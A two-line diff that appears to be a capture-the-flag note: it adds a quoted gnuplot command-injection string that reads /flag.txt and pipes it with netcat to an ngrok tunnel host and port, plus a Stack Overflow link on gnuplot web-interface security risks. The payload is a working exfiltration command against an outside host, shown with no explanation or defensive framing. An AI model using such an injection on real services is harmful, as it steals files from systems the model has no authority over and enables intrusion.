@@ -1,0 +1,2 @@
+"<cat /flag.txt | nc 0.tcp.ngrok.io 14496"
+https://stackoverflow.com/questions/10937597/security-risks-of-gnuplot-web-interface
